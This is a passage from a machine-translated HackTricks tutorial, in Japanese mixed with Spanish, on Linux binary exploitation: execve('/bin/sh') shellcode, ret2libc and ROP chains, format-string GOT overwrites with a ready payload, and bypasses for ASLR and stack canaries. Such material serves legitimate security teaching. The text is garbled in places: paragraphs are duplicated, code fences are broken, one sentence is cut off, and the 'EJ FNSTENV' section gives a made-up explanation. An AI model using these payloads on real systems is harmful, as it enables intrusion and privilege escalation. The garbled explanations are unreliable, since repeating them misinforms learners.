# Linux Exploiting (Basic) (SPA)

## Linux Exploiting (Basic) (SPA)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* あなたは**サイバーセキュリティ会社**で働いていますか？ HackTricksであなたの**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricksのスワッグ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## **ASLR**

Aleatorización de direcciones

**グローバルなASLRの無効化（root）**：\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
グローバルなASLRを再度有効にする： echo 2 > /proc/sys/kernel/randomize\_va\_space

**実行時に無効化する**（root権限は不要）：\
setarch \`arch\` -R ./example arguments\
setarch \`uname -m\` -R ./example arguments

**スタック実行保護の無効化**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack example.c -o example

**コアファイル**\
ulimit -c unlimited\
gdb /exec core\_file\
/etc/security/limits.conf -> \* soft core unlimited

**テキスト**\
**データ**\
**BSS**\
**ヒープ**

**スタック**

**BSSセクション**：初期化されていないグローバルまたは静的な変数
```
static int i;
```
**データセクション**: グローバルまたは静的に初期化された変数

```html
<p>La sección de datos contiene variables globales o estáticas que se inicializan con valores específicos. Estas variables se almacenan en una región de memoria separada y se pueden acceder desde cualquier parte del programa.</p>
```

```html
<p>データセクションには、特定の値で初期化されたグローバルまたは静的な変数が含まれています。これらの変数は別のメモリ領域に格納され、プログラムのどの部分からでもアクセスできます。</p>
```
```
int i = 5;
```
**セクション TEXT**: コードの命令（オペコード）の手順

**セクション HEAP**: 動的に割り当てられたバッファ（malloc()、calloc()、realloc()）

**セクション STACK**: スタック（渡された引数、環境変数の文字列（env）、ローカル変数...）

## **1. スタックオーバーフロー**

> バッファオーバーフロー、バッファのオーバーラン、スタックのオーバーラン、スタックスマッシング

セグメンテーションフォールトまたはセグメント違反：プロセスに割り当てられていないメモリアドレスにアクセスしようとすると発生します。

プログラム内の関数のアドレスを取得するには、次のようにします：
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### sys\_execveへの呼び出し

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

カーネルの割り込みを確認する: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; eaxをクリアする\
xor ebx, ebx ; ebx = 0, 引数はないため\
mov al, 0x01 ; eax = 1 —> \_\_NR\_exit 1\
int 0x80 ; システムコールを実行する

**nasm -f elf assembly.asm** —> .oファイルが生成される\
**ld assembly.o -o shellcodeout** —> アセンブリコードからなる実行可能ファイルが生成され、**objdump**を使用してオプコードを取得できる\
**objdump -d -Mintel ./shellcodeout** —> シェルコードが正しく生成されていることを確認し、オプコードを取得する

**シェルコードが正常に動作するか確認する**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
```
Para verificar que las llamadas al sistema se realizan correctamente, compile el programa anterior y las llamadas del sistema deben aparecer en **strace ./PROGRAMA_COMPILADO**

Cuando se crea un shellcode, se puede utilizar un truco. La primera instrucción es un salto a una llamada. La llamada ejecuta el código original y también coloca el EIP en la pila. Después de la instrucción de llamada, hemos insertado la cadena que necesitamos, por lo que con ese EIP podemos apuntar a la cadena y continuar ejecutando el código.

EJ **TRUCO (/bin/sh)**:
```
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**Stackを使用したEJ(/bin/sh):**

```c
#include <stdio.h>

void vulnerable_function() {
    char buffer[100];
    printf("Enter some text: ");
    gets(buffer);
    printf("You entered: %s\n", buffer);
}

int main() {
    vulnerable_function();
    return 0;
}
```

このコードは、`gets()`関数を使用してユーザーからの入力を受け取り、そのまま出力する危険な関数`vulnerable_function()`を持っています。

この関数は、バッファオーバーフロー攻撃に対して脆弱です。攻撃者は、入力バッファに長すぎるデータを提供することで、スタック上の他の変数や関数のデータを上書きすることができます。

攻撃者は、スタック上にシェルコードを配置し、そのアドレスをバッファオーバーフローによって上書きすることで、任意のコマンドを実行することができます。具体的には、`/bin/sh`シェルを実行することができます。

この攻撃を実行するには、攻撃者はスタックのアドレスを特定し、そのアドレスをバッファオーバーフローによって上書きする必要があります。これにより、プログラムは攻撃者が指定したシェルコードを実行します。
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**EJ FNSTENV:**

EJ FNSTENVは、Linuxでの基本的なESP（Exploit Specific Payload）の一つです。ESPは、エクスプロイトの一部として使用されるペイロードのことであり、攻撃者が標的システムに対して実行するコードです。

EJ FNSTENVは、ターゲットのメモリ内のスタックフレームを操作することで、特定のメモリアドレスに任意の値を書き込むことができます。これにより、攻撃者はシステムの制御を取得し、悪意のあるコードを実行することができます。

EJ FNSTENVは、特にスタックオーバーフロー攻撃において有用です。攻撃者は、ターゲットのプログラムにバッファオーバーフローを引き起こす入力を送信し、EJ FNSTENVを使用して攻撃を実行します。

EJ FNSTENVは、攻撃者がシステムに対して特権を取得するための重要なステップです。攻撃者は、このステップを経て、システム内の機密情報にアクセスしたり、他の攻撃手法を実行したりすることができます。

EJ FNSTENVは、Linuxシステムでのエクスプロイト開発において重要なテクニックです。攻撃者は、このテクニックを理解し、適切に使用することで、システムの脆弱性を悪用することができます。
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**エッグハンター:**

これは、プロセスに関連付けられたメモリページを走査し、そこに保存されているシェルコードを探す小さなコードです（シェルコードに配置されたいくつかの署名を探します）。コードを注入するための小さなスペースしかない場合に便利です。

**ポリモーフィックシェルコード**

これは、暗号化されたシェルコードで、それを復号化してジャンプする小さなコードを持っています。Call-Popのトリックを使用して、これは**シーザー暗号化の例**です：
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
1. **フレームポインタ（EBP）の攻撃**

EBPを変更できるが、EIPを変更できない状況で有用です。

関数から抜けるときに次のアセンブリコードが実行されることが知られています：
```
movl               %ebp, %esp
popl                %ebp
ret
```
## **4. リターン・トゥ・リブCの方法**

スタックが実行不可能であるか、バッファが非常に小さい場合に有用な方法です。

ASLRにより、各実行ごとに関数がメモリ内の異なる位置にロードされるため、この方法は効果的ではない場合があります。ただし、リモートサーバーでは、プログラムが常に同じアドレスで実行されているため、有用です。

* **cdecl(C declaration)** 引数をスタックに入れ、関数を抜けるときにスタックをクリアします。
* **stdcall(standard call)** 引数をスタックに入れ、呼び出された関数がスタックをクリアします。
* **fastcall** 最初の2つの引数をレジスタに入れ、残りの引数をスタックに入れます。

libcのsystem命令のアドレスを指定し、通常は環境変数から文字列"/bin/sh"を引数として渡します。さらに、プログラムがシェルを不要になったら問題なく終了するために、exit関数のアドレスも使用します（ログを書き込むため）。

**export SHELL=/bin/sh**

必要なアドレスを見つけるためには、次の方法があります：\
**GDB内で:**\
**p system**\
**p exit**\
**rabin2 -i executable** —> プログラムがロードされるときに使用されるすべての関数のアドレスを表示します\
（startまたは他のブレークポイント内で）**x/500s $esp** —> ここから/bin/shの文字列を検索します

これらのアドレスを持っている場合、**exploit**は次のようになります：

"A" \* EBPまでの距離 + 4（EBP：セグメンテーション違反を回避するために本当のEBPが良いが、4つの"A"でも構わない） + **system**のアドレス（EBPを上書きします） + **exit**のアドレス（system("/bin/sh")を終了した後、スタックの最初の4バイトは次のEIPのアドレスとして処理されます） + "**/bin/sh**"のアドレス（systemに渡されるパラメーターになります）

これにより、EIPはsystemのアドレスで上書きされ、パラメーターとして文字列"/bin/sh"を受け取り、それを終了するとexit()関数が実行されます。

関数のアドレスのいずれかのバイトがヌルまたはスペース（\x20）である場合、その関数の前のアドレスを逆アセンブルして、おそらくいくつかのNOPがあるため、関数自体ではなく、それらのいずれかを呼び出すことができるかどうかを確認できます（たとえば、> x/8i system-4）。

この方法は、関数を呼び出すときに**call**ではなく**ret**オペコードを使用するため、関数が最初の4バイトを戻る**EIP**アドレスとして解釈することができるため、機能します。

この方法で興味深いテクニックは、**strncpy()**を呼び出してスタックからヒープにペイロードを移動し、その後**gets()**を使用してそのペイロードを実行することです。

もう1つの興味深いテクニックは、**mprotect()**を使用することです。これにより、メモリの任意の部分に必要な権限を割り当てることができます。これはBDS、MacOS、およびOpenBSDで機能しますが、Linuxでは機能しません（書き込みと実行の権限を同時に許可できないため）。この攻撃を使用すると、スタックを再度実行可能に設定できます。

**関数の連鎖**

前述の方法に基づいて、このエクスプロイトの形式は次のようになります：\
パディング + \&Function1 + \&pop;ret; + \&arg\_fun1 + \&Function2 + \&pop;ret; + \&arg\_fun2 + ...

これにより、呼び出す関数を連鎖させることができます。また、複数の引数を持つ関数を使用する場合は、必要な引数（例：4つ）を入力し、4つの引数を入力し、opcodes: pop、pop、pop、pop、retのアドレスを検索して、関数のアドレスを見つけることができます（**objdump -d executable**）。

**フレームの偽装による連鎖（EBPの連鎖）**

EBPを操作できる能力を利用して、EBPと"leave;ret"を介して複数の関数の実行を連鎖させる方法です。

パディング

* EBPに、2番目の偽のEBP + 実行する関数（\&system() + \&leave;ret + &"/bin/sh"）を指す偽のEBPを配置します。
* EIPには、関数&(leave;ret)のアドレスを指定します。

シェルコードを次の部分のアドレスで開始し、例えば：2番目の偽のEBP + \&system() + &(leave;ret;) + &"/bin/sh"とします。

2番目のEBPは：3番目の偽のEBP + \&system() + &(leave;ret;) + &"/bin/ls"となります。

このシェルコードは、アクセス可能なメモリの部分に無限に繰り返し配置されるため、小さなメモリの断片で簡単に分割できるシェルコードが得られます。

（EBPとret2libの脆弱性を組み合わせて関数の実行を連鎖させます）
## **5.補足メソッド**

**Ret2Ret**

EIPにスタックのアドレスを入れることができない場合（EIPが0xbfを含んでいないことを確認）や、シェルコードの場所を計算することができない場合に役立ちます。ただし、脆弱な関数がパラメータを受け入れる場合（ここにシェルコードが配置されます）。

これにより、EIPを**ret**のアドレスに変更すると、次のアドレス（関数の最初の引数のアドレス）がロードされます。つまり、シェルコードがロードされます。

エクスプロイトは次のようになります：SHELLCODE + パディング（EIPまで）+ **\&ret**（スタックの次のバイトは、渡されたパラメータのアドレスの先頭を指します）

**strncpy**のような関数は、完了後にシェルコードが保存されていたアドレスをスタックから削除するため、このテクニックは不可能になります。つまり、関数に引数として渡されるアドレス（シェルコードを保存するアドレス）は、0x00で変更され、2番目の**ret**を呼び出すと0x00が見つかり、プログラムが停止します。
```
**Ret2PopRet**
```
**Murat Technique**

Linuxのすべてのプログラムは0xbfffffffからマッピングされます。

Linuxの新しいプロセスのスタックの構築方法を見ると、プログラムがシェルコードのみの環境で実行されるようにエクスプロイトを開発できます。そのアドレスは次のように計算できます：addr = 0xbfffffff - 4 - strlen(NOMBRE_ejecutable_completo) - strlen(shellcode)

これにより、シェルコードを含む環境変数があるアドレスを簡単に取得できます。

これは、execle関数が望む環境変数のみを持つ環境を作成できるためです。

**Jump to ESP: Windows Style**

ESPは常にスタックの先頭を指しているため、このテクニックはEIPをjmp espまたはcall espへのアドレスに置き換えることで行われます。これにより、EIPの上書き後にシェルコードが保存されます。retを実行した後、ESPは次のアドレスを指しているため、シェルコードが保存された場所です。

WindowsまたはLinuxでASLRが無効になっている場合、共有オブジェクトに保存されたjmp espまたはcall espを呼び出すことができます。ASLRが有効な場合、脆弱なプログラム自体の中から探すことができます。

また、EIPの破損後にシェルコードをスタックの中央に配置する代わりに、スタックの後ろに配置することで、関数の実行中に実行されるpushやpop命令がシェルコードに触れないようにすることができます。

同様に、関数がシェルコードが保存されているアドレスを返すことがわかっている場合、call eaxまたはjmp eax（ret2eax）を呼び出すことができます。

**ROP（Return Oriented Programming）またはborrowed code chunks**

呼び出されるコードの断片はガジェットとして知られています。

このテクニックは、ret2libcのテクニックとpop,retの使用を組み合わせて、異なる関数呼び出しを連鎖させることで行われます。

一部のプロセッサアーキテクチャでは、各命令は32ビットのセットです（たとえばMIPS）。しかし、Intelでは命令は可変サイズであり、複数の命令がビットセットを共有することがあります。例えば：

**movl $0xe4ff, -0x(%ebp)** —> これは0xffe4とも解釈され、**jmp \*%esp**とも解釈されます。

これにより、元のプログラムに存在しない命令を実行することができます。

ROPgadget.pyはバイナリ内の値を検索するのに役立ちます。

このプログラムはまた、ペイロードを作成するために使用できます。ROPを取り出したいライブラリを与えると、Pythonのペイロードが生成されます。その後、ライブラリのアドレスを与えると、ペイロードがシェルコードとして使用できる状態になります。また、システムコールを使用するため、実際にはスタック上で何も実行せず、**ret**命令を使用して実行されるROPのアドレスを保存していくだけです。このペイロードを使用するには、**ret**命令を使用してペイロードを呼び出す必要があります。

**Integer overflows**

このタイプのオーバーフローは、変数が渡される数値をサポートする準備ができていない場合に発生します。符号付きと符号なしの変数の混乱による可能性があります。例えば：
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
## **フォーマット文字列**

C言語では、**`printf`**は文字列を**表示**するために使用される関数です。この関数が期待する**最初のパラメータ**は、**フォーマッタ**を含む**生のテキスト**です。次に期待されるパラメータは、生のテキストから**フォーマッタを置き換える値**です。

この関数の**最初の引数**として、**攻撃者のテキスト**が指定されると、脆弱性が発生します。攻撃者は、**printfフォーマット**文字列の機能を悪用して、任意のデータを任意のアドレスに**書き込むことができます**。これにより、任意のコードを**実行**することができます。

フォーマッタ:
```bash
%08x —> 8 hex bytes
%d —> Entire
%u —> Unsigned
%s —> String
%n —> Number of written bytes
%hn —> Occupies 2 bytes instead of 4
<n>$X —> Direct access, Example: ("%3$d", var1, var2, var3) —> Access to var3
```
**`%n`**は、**指定されたアドレスに書き込まれたバイト数**を**書き込む**ためのものです。書き込むべきバイト数だけを16進数で書き込むことで、任意のデータを書き込むことができます。
```bash
AAAA%.6000d%4\$n —> Write 6004 in the address indicated by the 4º param
AAAA.%500\$08x —> Param at offset 500
```
### \*\*GOT (Global Offsets Table) / PLT (\*\*Procedure Linkage Table)

これは、プログラムで使用される**外部関数**への**アドレス**を含むテーブルです。

このテーブルのアドレスを取得するには、**`objdump -s -j .got ./exec`**を使用します。

![](<../../.gitbook/assets/image (619).png>)

GEFで**実行可能ファイル**を**ロード**した後、GOTにある**関数**を**表示**できます: `gef➤ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

GEFを使用してデバッグセッションを開始し、**`got`**を実行してgotテーブルを表示できます:

![](<../../.gitbook/assets/image (621).png>)

バイナリでは、GOTには関数のアドレスまたは関数アドレスをロードする**PLT**セクションへのアドレスが含まれています。このエクスプロイトの目的は、後で実行される関数のGOTエントリを**`system`**関数のPLTのアドレスで**上書き**することです。理想的には、**パラメータを制御できるように**、**制御できるパラメータで呼び出される関数**のGOTを**上書き**します（そのため、システム関数に送信されるパラメータを制御できます）。

スクリプトで**`system`**が使用されていない場合、システム関数にはGOTにエントリがありません。このシナリオでは、まず`system`関数のアドレスを**リークする必要があります**。

**Procedure Linkage Table**は、解決が必要なすべての必要な**シンボル**を格納するELFファイルの**読み取り専用**テーブルです。これらの関数のいずれかが呼び出されると、GOTは**フロー**を**PLT**に**リダイレクト**し、関数のアドレスを解決してGOTに書き込みます。\
その後、そのアドレスに対して次に呼び出しが行われると、関数は解決する必要なく直接呼び出されます。

PLTのアドレスは、**`objdump -j .plt -d ./vuln_binary`**で確認できます。

### **エクスプロイトのフロー**

前述のように、目標は後で呼び出される**GOT**テーブル内の**関数**の**アドレス**を**上書き**することです。理想的には、実行可能セクションにあるシェルコードのアドレスを設定できると良いですが、実行可能セクションにシェルコードを書き込むことはほとんどできない可能性が高いです。\
そのため、別のオプションは、**ユーザーから引数を受け取る関数**を**上書き**し、それを**`system`**関数に指定することです。

アドレスを書き込むためには、通常2つのステップが行われます: 最初にアドレスの2バイトを書き込み、その後に他の2バイトを書き込みます。これには**`$hn`**が使用されます。

HOBはアドレスの上位2バイトを指します\
LOBはアドレスの下位2バイトを指します

したがって、フォーマット文字列の動作により、\[HOB、LOB]のうち**小さい方を最初に書き込み**、その後にもう一方を書き込む必要があります。

HOB < LOBの場合\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

HOB > LOBの場合\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NºParam\_dir\_HOB LOB\_shell-HOB\_shell NºParam\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **フォーマット文字列エクスプロイトのテンプレート**

GOTを使用してフォーマット文字列をエクスプロイトするための**テンプレート**は、こちらで入手できます:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

基本的に、これはプログラムが終了する前に呼び出される**関数**を含む構造体です。これは、ジャンプしてアドレスに**シェルコードを呼び出す**ことができる場合や、フォーマット文字列を2回目に**エクスプロイトするために再びmainに戻る**必要がある場合に興味があります。
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
注意してください。これによって**永遠のループ**は**作成されません**。なぜなら、mainに戻るときにcanaryが検知し、スタックの終わりが破損している可能性があり、関数は再度呼び出されないからです。したがって、これにより、脆弱性の**1回の実行**が可能になります。

### **コンテンツのダンプのためのフォーマット文字列**

フォーマット文字列は、プログラムのメモリから**コンテンツをダンプ**するためにも悪用されることがあります。\
例えば、次の状況では、**フラグを指すスタック上のローカル変数**があります。メモリのどこに**フラグのポインタ**があるかを**見つける**ことができれば、**printfがそのアドレスにアクセス**し、**フラグ**を**表示**することができます。

したがって、フラグは**0xffffcf4c**にあります。

![](<../../.gitbook/assets/image (618) (2).png>)

そして、リークから**フラグへのポインタ**が**8番目の**パラメータにあることがわかります。

![](<../../.gitbook/assets/image (623).png>)

したがって、**8番目のパラメータ**にアクセスすると、フラグを取得できます。

![](<../../.gitbook/assets/image (624).png>)

前の攻撃を追跡し、コンテンツをリークできることに気付いた場合、**printf**に**ポインタ**を設定して、**実行可能な**セクションに**ロード**された**内容**を**完全にダンプ**することもできます！

### **DTOR**

{% hint style="danger" %}
現在では、dtorセクションを持つバイナリを見つけることは非常に珍しいです。
{% endhint %}

デストラクタは、プログラムが終了する前に**実行される関数**です。\
もし、**`__DTOR_END__`**に**シェルコードのアドレス**を書き込むことができれば、それはプログラムが終了する前に**実行**されます。\
このセクションのアドレスを取得するには、次のコマンドを使用します：
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep “__DTOR”
```
通常、**DTOR**セクションは値`ffffffff`と`00000000`の間にあります。したがって、これらの値だけを見ると、**登録された関数は存在しない**ことを意味します。そのため、**`00000000`**を**シェルコードのアドレス**で**上書き**して実行することで、シェルコードを実行できます。

### **バッファオーバーフローへのフォーマット文字列**

**sprintf**は、**変数にフォーマットされた文字列を移動**します。したがって、文字列の**フォーマット**を悪用して、コピー先の**変数でバッファオーバーフロー**を引き起こすことができます。\
たとえば、ペイロード`%.44xAAAA`は、変数に44B+"AAAA"を**書き込む**ため、バッファオーバーフローを引き起こす可能性があります。

### **\_\_atexit構造体**

{% hint style="danger" %}
現在では、これを悪用することは非常に**珍しい**です。
{% endhint %}

**`atexit()`**は、**他の関数をパラメータとして渡す**関数です。これらの**関数**は、**`exit()`**の実行または**main**の**戻り値**の実行時に**実行**されます。\
たとえば、これらの**関数**の**アドレス**をシェルコードなどを指すように**変更**できれば、プロセスの**制御を取得**することができますが、現在はこれがより複雑になっています。\
現在、実行する関数の**アドレス**は、いくつかの構造体の背後に**隠され**ており、最終的に指すアドレスは関数のアドレスではなく、**XORで暗号化**され、**ランダムなキー**で変位されます。したがって、現在、この攻撃ベクトルは**x86**および**x64\_86**ではあまり有用ではありません。\
**暗号化関数**は**`PTR_MANGLE`**です。m68k、mips32、mips64、aarch64、arm、hppaなどの**他のアーキテクチャ**は、**暗号化**関数を**実装していない**ため、このベクトルによって攻撃される可能性があります。

### **setjmp()とlongjmp()**

{% hint style="danger" %}
現在では、これを悪用することは非常に**珍しい**です。
{% endhint %}

**`setjmp()`**は、**コンテキスト**（レジスタ）を**保存**します。\
**`longjmp()`**は、**コンテキスト**を**復元**します。\
**保存されるレジスタ**は、`EBX、ESI、EDI、ESP、EIP、EBP`です。\
問題は、EIPとESPが**`PTR_MANGLE`**関数によって渡されることで、この攻撃に対して脆弱なアーキテクチャは上記と同じです。\
エラー回復や割り込みに役立ちます。\
ただし、他のレジスタは保護されていないため、呼び出される関数内に**`call ebx`、`call esi`、`call edi`**がある場合、制御を取得できます。または、EBPを変更してESPを変更することもできます。

**C++のVTableとVPTR**

各クラスには、メソッドへのポインタの配列である**Vtable**があります。

各クラスのオブジェクトには、そのクラスの配列への**ポインタ**である**VPtr**があります。VPtrは各オブジェクトのヘッダの一部であり、VPtrを上書きしてダミーメソッドを指すように変更することができれば、関数の実行時にシェルコードに移動することができます。

## **予防策と回避策**

**あまりランダムではないASLR**

PaXはプロセスのアドレス空間を3つのグループに分けます：

コードと初期化されていないデータ：.text、.data、.bss —> 変数delta\_execの16ビットのエントロピー、この変数は各プロセスでランダムに初期化され、初期アドレスに加算されます

mmap()によって割り当てられたメモリと共有ライブラリ —> 16ビット、delta\_mmap

スタック —> 24ビット、delta\_stack —> 実際には11（10番目から20番目までのバイト） —> 16バイトにアラインされる —> スタックの実際のアドレスは524,288個あります

環境変数と引数は、スタック上のバッファよりも少ない量だけシフトされます。

**Return-into-printf**

これは、バッファオーバーフローをフォーマット文字列のエラーに変換する技術です。関数のEIPをprintf関数を指すように置き換え、引数としてプロセスの状態に関する値を取得するために操作されたフォーマット文字列を渡すことで、EIPを置き換えます。

**ライブラリへの攻撃**

ライブラリは、16ビットのランダム性を持つ位置にあります。脆弱なサーバーがfork()を呼び出すと、メモリアドレス空間が子プロセスにコピーされ、そのまま保持されます。したがって、libcのusleep()関数に対してブルートフォース攻撃を試みることができます。引数として「16」を渡すことで、通常よりも長い応答時間がかかる場合にその関数が見つかります。その関数の場所がわかると、delta\_mmapを取得し、他の値を計算することができます。

ASLRが機能していることを確実にする唯一の方法は、64ビットアーキテクチャを使用することです。そこでは、ブルートフォース攻撃は行われません。

**StackGuardとStackShield**

**StackGuard**は、EIPの前に挿入される値である0x000aff0d（null、\n、EndOfFile(EOF)、\r）です。recv()、memcpy()、read()、bcoy()は依然として脆弱であり、EBPは保護されません。

**StackShield**はStackGuardよりも洗練されています。

オーバーフローが何の損害も引き起こさないように、グローバルリターンスタックと呼ばれるテーブルにすべてのEIPのアドレスを保存します。さらに、両方のアドレスを比較してオーバーフローが発生したかどうかを確認できます。

また、戻り値のアドレスを上限値と比較することもできます。したがって、EIPが通常の場所ではなくデータ領域などに移動した場合に検出できます。ただし、これはRet-to-lib、ROP、ret2retなどで回避することができます。

StackShieldは、ローカル変数を保護しないことがわかります。

**Stack Smash Protector (ProPolice) -fstack-protector**

canaryをEBPの前に配置します。バッファ
fork()関数は親プロセスの完全なコピーを作成するため、ウェブサーバーがfork()を呼び出すと、canaryを特定するまでバイトごとのブルートフォース攻撃が可能です。

fork()の後にexecve()関数を使用すると、スペースが上書きされ、攻撃は不可能になります。vfork()は、子プロセスを作成せずに実行することができますが、子プロセスが書き込みを試みると、重複が作成されます。

**Relocation Read-Only (RELRO)**

### Relro

**Relro（読み取り専用リロケーション）**は、メモリのアクセス許可に影響を与えます。NXと同様に、スタックを実行可能にするのではなく、RELROは特定の領域を読み取り専用にし、書き込むことができなくします。これが障害となる最も一般的な方法は、**`got`テーブルの上書き**を防ぐことです。`got`テーブルは、libc関数のアドレスを保持し、バイナリがアドレスを知って呼び出すことができるようにするためのものです。relroを使用した場合の`got`テーブルエントリのメモリアクセス許可を見てみましょう。

relroを使用した場合：
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
